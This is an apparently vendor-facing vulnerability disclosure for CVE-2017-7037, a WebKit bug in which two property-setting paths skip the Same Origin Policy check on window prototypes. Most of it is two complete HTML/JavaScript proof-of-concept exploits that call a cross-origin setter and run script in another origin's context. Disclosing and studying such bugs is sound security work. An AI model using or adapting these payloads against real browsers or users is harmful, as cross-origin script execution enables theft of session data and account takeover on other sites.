
CVE-2017-7037


JSObject::putInlineSlow and JSValue::putToPrimitive use getPrototypeDirect instead of getPrototype to get an object&#039;s prototype. So JSDOMWindow::getPrototype which checks the Same Origin Policy is not called.

The PoC shows to call a setter of another origin&#039;s object.

PoC 1 - JSValue::putToPrimitive:
<body>
<script>

let f = document.body.appendChild(document.createElement(&#039;iframe&#039;));
let loc = f.contentWindow.location;
f.onload = () => {
    let a = 1.2;
    a.__proto__.__proto__ = f.contentWindow;

    a[&#039;test&#039;] = {toString: function () {
        arguments.callee.caller.constructor(&#039;alert(location)&#039;)();
    }};
};
f.src = &#039;data:text/html,&#039; + `<iframe></iframe><script>
Object.prototype.__defineSetter__(&#039;test&#039;, v => {
    &#039;a&#039; + v;
});

</scrip` + `t>`;

</script>
</body>


PoC 2 - JSObject::putInlineSlow:
<body>
<script>

let f = document.body.appendChild(document.createElement(&#039;iframe&#039;));
let loc = f.contentWindow.location;
f.onload = () => {
    let a = {
        __proto__: f.contentWindow
    };

    a[&#039;test&#039;] = {toString: function () {
        arguments.callee.caller.constructor(&#039;alert(location)&#039;)();
    }};
};
f.src = &#039;data:text/html,&#039; + `<iframe></iframe><script>
Object.prototype.__defineSetter__(&#039;test&#039;, v => {
    &#039;a&#039; + v;
});

</scrip` + `t>`;
</script>
</body>

This bug is subject to a 90 day disclosure deadline. After 90 days elapse
or a patch has been made broadly available, the bug report will become
visible to the public.

